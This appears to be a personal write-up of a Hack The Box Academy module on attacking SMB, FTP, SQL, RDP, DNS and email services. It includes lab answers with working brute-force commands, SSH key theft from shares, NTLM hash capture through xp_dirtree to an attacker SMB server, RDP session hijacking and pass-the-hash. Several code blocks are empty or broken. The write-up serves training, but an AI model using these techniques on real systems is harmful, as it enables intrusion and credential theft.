# Attacking Common Services

This section will focus on internal services, but this may apply to cloud storage synced locally to servers and workstations.
## Server Message Block (SMB)

SMB is commonly used in Windows networks, and we will often find share folders in a Windows network. We can interact with SMB using the GUI, CLI, or tools. Let us cover some common ways of interacting with SMB using Windows & Linux.

## Windows

To open the Run dialog box and type the file share location, e.g.: `\\192.168.220.129\Finance\`
The command [net use](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/gg651155(v=ws.11)) connects a computer to or disconnects a computer from a shared resource or displays information about computer connections. We can connect to a file share with the following command and map its content to the drive letter `n`.
```cmd-session
C:\htb> net use n: \\192.168.220.129\Finance

The command completed successfully.
```

With the shared folder mapped as the `n` drive, we can execute Windows commands as if this shared folder is on our local computer. Let's find how many files the shared folder and its subdirectories contain.
```cmd-session
C:\htb> dir n: /a-d /s /b | find /c ":\"

29302
```

| Syntax | Description                                                    |
| ------ | -------------------------------------------------------------- |
| `dir`  | Application                                                    |
| `n:`   | Directory or drive to search                                   |
| `/a-d` | `/a` is the attribute and `-d` means not directories           |
| `/s`   | Displays files in a specified directory and all subdirectories |
| `/b`   | Uses bare format (no heading information or summary)           |
The following command `| find /c ":\\"` process the output of `dir n: /a-d /s /b` to count how many files exist in the directory and subdirectories. You can use `dir /?` to see the full help. Searching through 29,302 files is time consuming, scripting and command line utilities can help us speed up the search. With `dir` we can search for specific names in files such as:

- cred
- password
- users
- secrets
- key
- Common File Extensions for source code such as: .cs, .c, .go, .java, .php, .asp, .aspx, .html.
```cmd-session
C:\htb>dir n:\*cred* /s /b

n:\Contracts\private\credentials.txt


C:\htb>dir n:\*secret* /s /b

n:\Contracts\private\secret.txt
```

If we want to search for a specific word within a text file, we can use [findstr](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/findstr).
```cmd-session
c:\htb>findstr /s /i cred n:\*.*

n:\Contracts\private\secret.txt:file with all credentials
n:\Contracts\private\credentials.txt:admin:SecureCredentials!
```

PowerShell was designed to extend the capabilities of the Command shell to run PowerShell commands called `cmdlets`. Cmdlets are similar to Windows commands but provide a more extensible scripting language. We can run both Windows commands and PowerShell cmdlets in PowerShell, but the Command shell can only run Windows commands and not PowerShell cmdlets

#### Linux

Linux (UNIX) machines can also be used to browse and mount SMB shares. Note that this can be done whether the target server is a Windows machine or a Samba server. Even though some Linux distributions support a GUI, we will focus on Linux command-line utilities and tools to interact with SMB. Let's cover how to mount SMB shares to interact with directories and files locally.

```shell-session
r3so1v3@htb[/htb]$ sudo mkdir /mnt/Finance
r3so1v3@htb[/htb]$ sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //192.168.220.129/Finance /mnt/Finance
```

Alternatively we can use a credentials file
```shell-session
r3so1v3@htb[/htb]$ mount -t cifs //192.168.220.129/Finance /mnt/Finance -o credentials=/path/credentialfile
```

We need to install `cifs-utils` to connect to an SMB share folder. To install it we can execute from the command line `sudo apt install cifs-utils`.

#### Linux - Find
```shell-session
r3so1v3@htb[/htb]$ find /mnt/Finance/ -name *cred*

/mnt/Finance/Contracts/private/credentials.txt
```

Next, let's find files that contain the string `cred`:
```shell-session
r3so1v3@htb[/htb]$ grep -rn /mnt/Finance/ -ie cred

/mnt/Finance/Contracts/private/credentials.txt:1:admin:SecureCredentials!
/mnt/Finance/Contracts/private/secret.txt:1:file with all credentials
```

### The Concept of Attacks
![](https://i.imgur.com/Xx3MCDa.png)

First, we have a `Source` that performs the specific request to a `Process` where the vulnerability gets triggered. Each process has a specific set of `Privileges` with which it is executed. Each process has a task with a specific goal or `Destination` to either compute new data or forward it. However, the individual and unique specifications under these categories may differ from service to service.

Sensitive information may include, but is not limited to:

- Usernames.
- Email Addresses.
- Passwords.
- DNS records.
- IP Addresses.
- Source code.
- Configuration files.
- PII.
## FTP - File Transfer Protocol
## SMB - Server Message Block

Anonymous Authentication

If we find an SMB server that does not require a username and password or find valid credentials, we can get a list of shares, usernames, groups, permissions, policies, services, etc. Most tools that interact with SMB allow null session connectivity, including smbclient, smbmap, rpcclient, or enum4linux. Let's explore how we can interact with file shares and RPC using null authentication.

### SQL - Structured Query Language

By default, MSSQL uses ports `TCP/1433` and `UDP/1434`, and MySQL uses `TCP/3306`. However, when MSSQL operates in a "hidden" mode, it uses the `TCP/2433` port. We can use `Nmap`'s default scripts `-sC` option to enumerate database services on a target system.
`MSSQL` supports two [authentication modes](https://docs.microsoft.com/en-us/sql/connect/ado-net/sql/authentication-sql-server), which means that users can be created in Windows or the SQL Server:


### RDP - Remote Desktop Protocol
Since RDP takes user credentials for authentication, one common attack vector against the RDP protocol is password guessing. For this we use technique - password spraying, for this we can use: crowbar, hydra

Let's imagine we successfully gain access to a machine and have an account with local administrator privileges. If a user is connected via RDP to our compromised machine, we can hijack the user's remote desktop session to escalate our privileges and impersonate the account. In an Active Directory environment, this could result in us taking over a Domain Admin account or furthering our access within the domain.

To successfully impersonate a user without their password, we need to have SYSTEM privileges and use the Microsoft tscon.exe binary that enables users to connect to another desktop session. It works by specifying which SESSION ID  we would like to connect to which session name. So, for example, the following command will open a new console as the specified SESSION_ID within our current RDP session:
Attacking RDP

```
C:\htb> tscon #{TARGET_SESSION_ID} /dest:#{OUR_SESSION_NAME}
```

If we have local administrator privileges, we can use several methods to obtain SYSTEM privileges, such as PsExec or Mimikatz.


| **Authentication Type**       | **Description**                                                                                                                                                                                                                                                                                                                           |
| ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `Windows authentication mode` | This is the default, often referred to as `integrated` security because the SQL Server security model is tightly integrated with Windows/Active Directory. Specific Windows user and group accounts are trusted to log in to SQL Server. Windows users who have already been authenticated do not have to present additional credentials. |
| `Mixed mode`                  | Mixed mode supports authentication by Windows/Active Directory accounts and SQL Server. Username and password pairs are maintained within SQL Server.                                                                                                                                                                                     |

# Questions & Answers

### Attacking FTP

1.  What port is the FTP service running on?

Do nmap scan and see that it is 2121

2.  What username is available for the FTP server?

First things first we need to try logging in as anonymous:
```
ftp -P 2121 anonymous@10.129.203.6
Connected to 10.129.203.6.
ls
220 ProFTPD Server (InlaneFTP) [10.129.203.6]
331 Anonymous login ok, send your complete email address as your password
Password: 
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||22514|)
150 Opening ASCII mode data connection for file list
-rw-r--r--   1 ftp      ftp          1959 Apr 19  2022 passwords.list
-rw-rw-r--   1 ftp      ftp            72 Apr 19  2022 users.list

```

Then download both lists using get users.list and get passwords.list
Then open the users.list and try putting all the usernames to the htb-academy answer box until it gives correct

3. Use the discovered username with its password to login via SSH and obtain the flag.txt file. Submit the contents as your answer. 

Then we can try bruteforcing with hydra for password, not medusa, cuz it takes longer:
```
hydra -l robin -P /home/r3so1ve/hack/htb-academy/attacking-common-services/passwords.list ftp://10.129.203.6:2121 -t 10

Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

```

As we now the creds now:
```
username: robin
password: 7iz4rnckjsduza7
```

We ssh to target and get the flag:
```
ssh robin@10.129.203.6
```

### Attacking SMB

4. What is the name of the shared folder with READ permissions? 

So we need to use smbmap for this, as this tool will give us info about permissions, not smbclient
```
smbmap -H 10.129.203.6
[+] IP: 10.129.203.6:445	Name: 10.129.203.6                                      
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	print$                                            	NO ACCESS	Printer Drivers
	GGJ                                               	READ ONLY	Priv
	IPC$                                              	NO ACCESS	IPC Service (attcsvc-linux Samba)
```

5. What is the password for the username "jason"? 

So first of all we need to find the username jason, for this we use:
```
enum4linux-ng 10.129.203.6 -A

=====================================
|    Users via RPC on 10.129.203.6    |
 =====================================
[*] Enumerating users via 'querydispinfo'
[+] Found 2 user(s) via 'querydispinfo'
[*] Enumerating users via 'enumdomusers'
[+] Found 2 user(s) via 'enumdomusers'
[+] After merging user results we have 2 user(s) total:
'1000':
  username: jason
  name: ''
  acb: '0x00000010'
  description: ''
'1001':
  username: robin
  name: ''
  acb: '0x00000010'
  description: ''

```

The output of the above command is much longer, but I included only the piece with username
Then we can use crackmapexec to bruteforce password for jason:
```
crackmapexec smb 10.129.203.6 -u 'jason' -p pws.list --local-auth
SMB         10.129.203.6    445    ATTCSVC-LINUX    [*] Windows 6.1 Build 0 (name:ATTCSVC-LINUX) (domain:ATTCSVC-LINUX) (signing:False) (SMBv1:False)

```

6. Login as the user "jason" via SSH and find the flag.txt file. Submit the contents as your answer. 

As we now the username and password, so we can try to ssh as jason to target, but when we try it, we get:
```
ssh jason@10.129.203.6             
jason@10.129.203.6: Permission denied (publickey).
```

This means that we need to get `id_rsa` which located in the GGJ share, but at first we need to mount to share. Mounting a shared folder from a remote server (like an SMB share) allows you to access its contents as if they were part of your local filesystem. In this case, the reason to mount the SMB share is to access the `id_rsa` file (which is the SSH private key for the user) from the `GGJ` share on the remote server.

First create the folder for mounting:
```
sudo mkdir -p /mnt/smb_htb
```

So we mount and then copy it (`id_rsa`)to your comfy location:
```
sudo mount -t cifs //10.129.203.6/GGJ /mnt/smb_htb -o username=jason,password='34c8zuNBo91!@28Bszh',ro 
cp /mnt/smb_htb/id_rsa /home/r3so1ve/hack/htb-academy/attacking-common-services/
```

Making sure we got it:
```
ls
total 24K
-rwxr-xr-x 1 r3so1ve r3so1ve 3.4K Sep 26 11:59 id_rsa
-rw-r--r-- 1 r3so1ve r3so1ve 2.0K Sep 25 22:17 passwords.list
-rw-rw-r-- 1 r3so1ve r3so1ve 2.5K May  9  2022 pws.list
-rw-r--r-- 1 r3so1ve r3so1ve 1.6K Aug 23 15:09 pws.zip
-rw-rw-r-- 1 r3so1ve r3so1ve   72 Sep 25 22:17 users.list
-rw-r--r-- 1 r3so1ve r3so1ve  434 Aug 23 15:09 users.zip

```

Don't forget to change permissions:
```
chmod 600 id_rsa 
```

And finally ssh to target:
```
ssh jason@10.129.203.6 -i id_rsa

### Attacking SQL Databases

Authenticate to 10.129.203.12 (ACADEMY-ATTCOMSVC-WIN-02) with user "htbdbuser" and password "MSSQLAccess01!"

7. What is the password for the "mssqlsvc" user?

First of all I ran nmap script:
```
nmap -Pn -sV -sC -p- 10.10.10.125 --min-rate 3000 -n
```

Then I discovered that port 1433 was opened. And as we have creds to authenticate to DB I decided to use sqsh tool for that at first
I decided to install it, but had problems with no properly installed FreeTDS or Sybase environment found in /usr. So later I decided to use sqlcmd tool instead sqsh
I also needed to install it first:
```
sudo apt update 
sudo apt install curl apt-transport-https
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
echo "deb [arch=amd64] https://packages.microsoft.com/repos/ubuntu/ focal main" | sudo tee /etc/apt/sources.list.d/mssql-release.list
sudo apt update
sudo apt install mssql-tools
export PATH="$PATH:/opt/mssql-tools/bin"
source ~/.bashrc  # или source ~/.zshrc, если вы используете Zsh
sqlcmd -?
```

Insert the above commands one by one to install sqlcmd
Then as we successfully installed it, we can now connect to DB:
```
sqlcmd -S 10.129.68.230 -U htbdbuser
Password: 
1> show databases;
2> go

--------------------------------------------------------------------------------------------------------------------------------

tempdb                                                                                                                          
model                                                                                                                           
msdb                                                                                                                            
hmaildb                                                                                                                         
flagDB                           
```

As we need to get the password of the user mssqlcvs we can do this by XP_SUBDIRS Hash Stealing with impacket
On attacking machine:
```
sudo impacket-smbserver share ./ -smb2support 
[sudo] password for r3so1v3: 
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

```

Then we run:
```
1> EXEC master..xp_dirtree '\\10.10.16.43\share\'
2> GO
subdirectory                                                                                                                                                                                                                                                         depth      
-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- -----------

(0 rows affected)
```

This way we use XP_DIRTREE for Hash Stealing
After that we need to return to our attack machine and we can see that we got hash:
```
sudo impacket-smbserver share ./ -smb2support

[*] Closing down connection (10.129.68.230,49676)
[*] Remaining connections []

```

Now we need to crack it using john the ripper. But firstly copy and paste the above hash into the file, for example "hash". Then start cracking it:
```
john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
princess1        (mssqlsvc)

Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed. 
```
So we see that we got the password: princess1

9. Enumerate the "flagDB" database and submit a flag as your answer.

First we need to connect to MySQL via sqlcmd:
```
sqlcmd -S 10.129.26.147 -U htbdbuser
```

Enter the password provided by the task and we are in
Next we use impacket tools to log in to mssql database using the user mssqlcvs and password princess1. It would typically be used in a penetration testing scenario to try to authenticate and interact with the SQL Server.
```
impacket-mssqlclient -port 1433 -target-ip 10.129.26.147 mssqlsvc@10.129.26.147 -windows-auth

```

We can use the following command to list the available dbs:
```
SQL (WIN-02\mssqlsvc  guest@master)> enum_db
name      is_trustworthy_on   
-------   -----------------   
master                    0

hmaildb                   0   

flagDB                    0   
```

Also we can see the users, owners and logins:
```

```

Then we need to verify our current user and role:
```
sqlcmd -S 10.129.26.147 -U htbdbuser
Password: 
1> SELECT SYSTEM_USER
2> SELECT IS_SRVROLEMEMBER('sysadmin')
3> go
                                                                                                                                
--------------------------------------------------------------------------------------------------------------------------------
htbdbuser                                                                                                                       

(1 rows affected)
           
-----------
          0

(1 rows affected)

```

Now we need to attempt to log into a Microsoft SQL Server running on the IP address `10.129.26.147` over port `1433` using the `mssqlsvc` account in the `WIN-02` domain via Windows authentication:
```
impacket-mssqlclient -port 1433 -target-ip 10.129.26.147 WIN-02/mssqlsvc@10.129.26.147 -windows-auth

Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

Next I decided to change to flagDB database:
```
SQL (WIN-02\mssqlsvc  guest@master)> use flagDB
ENVCHANGE(DATABASE): Old Value: master, New Value: flagDB
INFO(WIN-02\SQLEXPRESS): Line 1: Changed database context to 'flagDB'.

```

Later on I used xp_dirtree to list the directories available on the SQL Server's file system and used`select table_name from information_schema.tables`  to list all the tables in the `flagDB` and finally fetched the content of the flag:
```

### Attacking RDP

RDP to with user "htb-rdp" and password "HTBRocks!" 

10. What is the name of the file that was left on the Desktop? (Format example: filename.txt) 

To do that we need to log in to RDP via xfreerdp for example:
```
xfreerdp /v:10.129.26.153 /u:htb-rdp /p:HTBRocks!
```

And on the desktop we see the file: pentest-notes.txt which contains the following message:
```
We found a hash from another machine Administrator account, we tried the hash in this computer but it didn't work, it doesn't have SMB or WinRM open, RDP Pass the Hash is not working.

User: Administrator
Hash: 0E14B9D6330BF16C30B1924111104824
```

11. Which registry key needs to be changed to allow Pass-the-Hash with the RDP protocol? 

DisableRestrictedAdmin - simply read the module

12.  Connect via RDP with the Administrator account and submit the flag.txt as you answer. 

As we have hash it is one command that separates us from obtaining the flag now:
```
xfreerdp /v:10.129.26.153 /u:Administrator /pth:0E14B9D6330BF16C30B1924111104824
```


### Attacking DNS

13.  Find all available DNS records for the "inlanefreight.htb" domain on the target name server and submit the flag found as a DNS record as the answer. 

As hints suggest to use subbrute. This tool allows us to use self-defined resolvers and perform pure DNS brute-forcing attacks during internal penetration tests on hosts that do not have Internet access.
```
./subbrute.py inlanefreight.htb -s ./names.txt -r ./resolvers.txt

/home/r3so1v3/Hacking/academy/common-services/subbrute/./subbrute.py:462: SyntaxWarning: invalid escape sequence '\.'
  permute_filter = re.compile("^[a-zA-Z0-9]{" + str(self.permute_len) + "}\.")
Warning: Fewer than 16 resolvers per process, consider adding more nameservers to resolvers.txt.

inlanefreight.htb
hr.inlanefreight.htb  
```

So it took quite a long time to get `hr` subdomain but when I got it, the next step is to use dig utility with DNS query type AXFR option to dump the entire DNS namespaces from a vulnerable DNS server:
```
dig AXFR @10.129.27.0 hr.inlanefreight.htb

; <<>> DiG 9.19.19-1-Debian <<>> AXFR @10.129.27.0 hr.inlanefreight.htb

```

### Attacking Email Services

14.  What is the available username for the domain inlanefreight.htb in the SMTP server?

For enumeration of smtp service we can use script https://github.com/pentestmonkey/smtp-user-enum/blob/master/smtp-user-enum.pl
```
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.188.131

```

So the user is marlin

15.  Access the email account using the user credentials that you discovered and submit the flag in the email as your answer. 

As we got martin, let's find out the password. OF course nothing is easy, especially in Hackthebox. I wasted 1 hour for sure, figuring out the password, using hydra, medusa, 0365spray but it was not that obvious. To get the password we need to use the 'full' username 😆 which is marlin@... So here it is:
```
hydra -l marlin@inlanefreight.htb -P pws.list -s 25 -f 10.129.188.131 smtp

```

Fucking love it ;)
Next is we need to log in to one of the email services. I tried pop3 and it worked well. I liked the process lowkey, cuz never used it before.
```

Hi admin,

How can I change my password to something more secure? 

flag: HTB{w34k_p4$$w0rd}
```


## Skills Assessment

### Easy

You are targeting the inlanefreight.htb domain. Assess the target server and obtain the contents of the flag.txt file. Submit it as the answer. 

First of all we add our dns and ip to /etc/hosts file:
```
sudo nano /etc/hosts

<IP> inlanefreight.htb
```

Then we do nmap scan:
```
nmap -Pn -sV -sC -p- --min-rate=200 -T 4 -oN easylab -v 10.129.203.7
Nmap scan report for 10.129.203.7

As we can see we have plenty of ports opened. 
I tried ftp, mysql, but they seem to be used later
For know I started to enumerate smtp service and for that I user smtp-user-enum tool:
```
smtp-user-enum -M RCPT -U users.list -D inlanefreight.htb -t 10.129.203.7  
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

So we found the username and now it's time to get the password with hydra:

We got the creds:

Now we can log in to mysql service:
```
mysql -u fiona -p987654321 -h 10.129.232.182 --skip-ssl

As we can see from the output, we have ssh, ftp on 2121 and 30021, domain, pop3 and protected pop3
I immediately decided to anonymous login to 2121 ftp but that did not work. So I tried 30021 ftp port for that and this time was successfully logged in as anonymous:
```
ftp 10.129.208.17 -p 30021

```

We can see that there is some user `simon` and there is a file `mynotes.txt`
Let's see what's inside it after downloading it:
```
cat mynotes.txt 
234987123948729384293

```

Seems to be some passwords. I instantly started brute-forcing ssh service with `simon` username and `mynotes.txt` file as passwords using hydra:
```
hydra -l simon -P mynotes.txt -u 10.129.208.17 ssh

```

We got creds now:
```

```

I decided to try them to 2121 ftp service and managed to log in as `simon` with the his password:

```

We see flag.txt file, so as we downloaded it via `get` command we can `cat` it in our directory. Note we can use ordinary commands like: ls, ls -la, cd in ftp service:
```
cat flag.txt      
HTB{1qay2wsx3EDC4rfv_M3D1UM}
```

After finding flag.txt, I also found out that we can get it from logging into the ssh service with the same creds. Just so you know that there are several ways of solving this lab ;)


### Hard

1. What file can you retrieve that belongs to the user "simon"? (Format: filename.txt) 

As usual we start with nmap scan:

2. Enumerate the target and find a password for the user Fiona. What is her password? 

For that we need to utilize the creds.txt file that we obtained in the Home share in IT/Fiona directory
```
hydra -l Fiona -P creds.txt 10.129.214.228 rdp

```


4. Once logged in, what other user can we compromise to gain admin privileges? 

As from the share results inside IT directory we saw 3 users and the one haven't appeared in the questions yet is `john` so it's correct answer

Then open powershell and use sqlcmd tool:

6. Submit the contents of the flag.txt file on the Administrator Desktop. 


```

```
